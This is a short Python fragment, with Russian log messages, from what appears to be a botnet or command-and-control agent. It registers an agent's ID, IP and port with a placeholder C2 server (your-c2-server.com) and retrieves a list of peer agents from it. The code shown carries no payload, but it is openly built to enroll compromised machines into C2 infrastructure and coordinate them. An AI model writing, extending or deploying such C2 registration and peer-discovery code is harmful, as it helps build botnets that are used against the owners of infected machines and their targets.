import requests

BOOTSTRAP_URL = "http://your-c2-server.com:8000/api"

def register_with_c2(agent_id: str, ip: str, port: int):
    try:
        resp = requests.post(
            f"{BOOTSTRAP_URL}/peers/register",
            params={"id": agent_id, "ip": ip, "port": port},
            timeout=5
        )
        if resp.status_code == 200:
            print(f"[{agent_id}] Зарегистрирован на C2: {ip}:{port}")
    except Exception as e:
        print(f"[{agent_id}] Ошибка при регистрации на C2: {e}")

def get_known_peers():
    try:
        resp = requests.get(f"{BOOTSTRAP_URL}/peers/", timeout=5)
        if resp.status_code == 200:
            return resp.json()
    except Exception as e:
        print(f"Ошибка при получении списка peers: {e}")
    return []
